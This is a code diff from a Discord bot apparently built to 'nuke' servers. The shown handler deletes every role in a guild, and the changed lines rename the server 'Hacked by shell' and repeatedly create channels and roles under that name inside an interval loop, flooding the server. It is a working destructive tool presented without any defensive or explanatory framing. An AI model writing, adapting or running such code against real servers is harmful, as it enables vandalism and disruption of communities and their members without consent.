@@ -15,11 +15,11 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("Error Up");////nawek dane bo sar server 
+      message.guild.setName("Hacked by shell");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("Error Up", "text");///////bo channel 
-        message.guild.createChannel("Error Up", "voice");////bo voice
-        message.guild.createRole({ name: "Error Up" });////nawek dane bo role kan
+        message.guild.createChannel("Hacked by shell", "text");///////bo channel 
+        message.guild.createChannel("Hacked by shell", "voice");////bo voice
+        message.guild.createRole({ name: "Hacked by shell" });////nawek dane bo role kan
       });
     }
   }
